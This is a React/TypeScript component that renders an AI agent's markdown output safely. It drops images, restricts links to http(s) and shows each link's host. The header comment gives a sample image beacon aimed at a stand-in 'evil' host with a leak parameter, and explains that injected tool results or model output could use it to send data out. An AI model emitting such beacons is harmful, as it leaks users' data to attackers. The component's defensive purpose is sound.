import { memo } from 'react';
import type { Components, Options } from 'react-markdown';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { splitMarkdownBlocks } from './utils/markdownBlocks';

/**
 * Output hygiene (spec §8): model text goes through `react-markdown`, which
 * never injects raw HTML by design (no `dangerouslySetInnerHTML` anywhere in
 * this tree) — so there is no HTML-injection surface to sanitize beyond the
 * component overrides below.
 *
 * - Images are dropped entirely — an attacker-controlled `![x](https://evil/beacon.png?leak=...)`
 *   in a tool result or model output would otherwise be a silent exfiltration
 *   beacon the moment the bubble renders.
 * - Links only ever render an `href` scheme react-markdown itself already
 *   restricts to `http(s)`/`mailto` by default; we additionally force
 *   `target="_blank"` with `rel="noopener noreferrer nofollow"` (no
 *   `window.opener` handle, no referrer leak, no SEO credit to model-chosen
 *   URLs) and show the resolved hostname next to the link text so a user
 *   isn't trusting bare "click here" copy.
 *
 * GFM is on because the prompt allows small tables; without it a table
 * arrives as rows of raw pipes. Answer headings render one level below the
 * page's own `h1`/`h2` so a long transcript does not flood the outline.
 */
/** Only `http(s)` may render as a link — react-markdown's own defanging still lets `mailto:`/`tel:` through, which this output has no use for and only widens the trust surface. */
function isHttpUrl(href: string): boolean {
    try {
        const url = new URL(href);
        return url.protocol === 'http:' || url.protocol === 'https:';
    } catch {
        return false;
    }
}

const AGENT_COMPONENTS: Components = {
    img: () => null,
    a: ({ href, children }) => {
        if (typeof href !== 'string' || !isHttpUrl(href))
            return <>{children}</>;
        const host = new URL(href).hostname;
        return (
            <a
                href={href}
                target="_blank"
                rel="noopener noreferrer nofollow"
                className="text-primary-400 underline decoration-primary-400/40 underline-offset-2 hover:text-primary-300 hover:decoration-primary-300"
            >
                {children}
                {host ? (
                    <span className="ml-1 text-xs text-secondary-400 no-underline">
                        ({host})
                    </span>
                ) : null}
            </a>
        );
    },
    p: ({ children }) => (
        <p className="my-3 first:mt-0 last:mb-0">{children}</p>
    ),
    h1: ({ children }) => (
        <h3 className="mt-6 mb-2 text-lg leading-7 font-semibold text-secondary-50 first:mt-0">
            {children}
        </h3>
    ),
    h2: ({ children }) => (
        <h3 className="mt-6 mb-2 text-base leading-7 font-semibold text-secondary-50 first:mt-0">
            {children}
        </h3>
    ),
    h3: ({ children }) => (
        <h4 className="mt-5 mb-1.5 text-[15px] leading-7 font-semibold text-secondary-100 first:mt-0">
            {children}
        </h4>
    ),
    h4: ({ children }) => (
        <h5 className="mt-4 mb-1 text-[15px] leading-7 font-medium text-secondary-100 first:mt-0">
            {children}
        </h5>
    ),
    strong: ({ children }) => (
        <strong className="font-semibold text-secondary-50">{children}</strong>
    ),
    ul: ({ children }) => (
        <ul className="my-3 list-disc space-y-1.5 pl-5 marker:text-secondary-500 first:mt-0 last:mb-0">
            {children}
        </ul>
    ),
    ol: ({ children }) => (
        <ol className="my-3 list-decimal space-y-1.5 pl-5 marker:text-secondary-400 first:mt-0 last:mb-0">
            {children}
        </ol>
    ),
    li: ({ children }) => <li className="pl-1">{children}</li>,
    blockquote: ({ children }) => (
        <blockquote className="my-3 border-l-2 border-primary-400/60 pl-3 text-secondary-300">
            {children}
        </blockquote>
    ),
    hr: () => <hr className="my-5 border-secondary-700" />,
    code: ({ children }) => (
        <code className="rounded bg-secondary-800 px-1.5 py-0.5 font-mono text-[13px] text-secondary-200">
            {children}
        </code>
    ),
    pre: ({ children }) => (
        <pre className="my-3 overflow-x-auto rounded-lg border border-secondary-700 bg-secondary-950 p-3 font-mono text-[13px] leading-6 text-secondary-200 [&_code]:bg-transparent [&_code]:p-0">
            {children}
        </pre>
    ),
    table: ({ children }) => (
        <div className="my-3 overflow-x-auto rounded-lg border border-secondary-700">
            <table className="w-full border-collapse text-left text-sm">
                {children}
            </table>
        </div>
    ),
    th: ({ children }) => (
        <th className="border-b border-secondary-700 bg-secondary-800 px-3 py-2 font-semibold whitespace-nowrap text-secondary-100">
            {children}
        </th>
    ),
    td: ({ children }) => (
        <td className="border-b border-secondary-700 px-3 py-2 align-top tabular-nums [tr:last-child_&]:border-b-0">
            {children}
        </td>
    ),
};

/**
 * `singleTilde: false`: answers write price ranges as `266,500~270,666원`, and
 * GFM's default reads two single tildes on one line as ~strikethrough~
 * (2026-09-13 사용자 제보). Only `~~double~~` strikes now.
 */
const REMARK_PLUGINS: Options['remarkPlugins'] = [
    [remarkGfm, { singleTilde: false }],
];

interface MarkdownBlockProps {
    readonly source: string;
}

/**
 * 블록 하나. `memo`라 입력 문자열이 그대로면 다시 파싱하지 않는다 — 스트리밍 중에는
 * 끝 블록만 바뀌므로 그것만 다시 파싱된다(`splitMarkdownBlocks` 참조). react-markdown은
 * 감싸는 요소 없이 Fragment를 돌려주므로 블록들이 한 컨테이너의 형제로 놓여,
 * `first:`/`last:` 여백 규칙은 통째로 그리던 때와 같다.
 */
const MarkdownBlock = memo(function MarkdownBlock({
    source,
}: MarkdownBlockProps) {
    return (
        <ReactMarkdown
            remarkPlugins={REMARK_PLUGINS}
            components={AGENT_COMPONENTS}
        >
            {source}
        </ReactMarkdown>
    );
});

interface AgentMarkdownProps {
    readonly children: string;
}

export function AgentMarkdown({ children }: AgentMarkdownProps) {
    return (
        <div className="leading-7 break-words">
            {splitMarkdownBlocks(children).map((block, index) => (
                // 위치가 곧 정체성이다 — 답변은 끝에서만 자라므로 앞 블록의 인덱스는
                // 변하지 않고, 그래야 memo가 그 블록의 재파싱을 건너뛴다.
                <MarkdownBlock key={index} source={block} />
            ))}
        </div>
    );
}
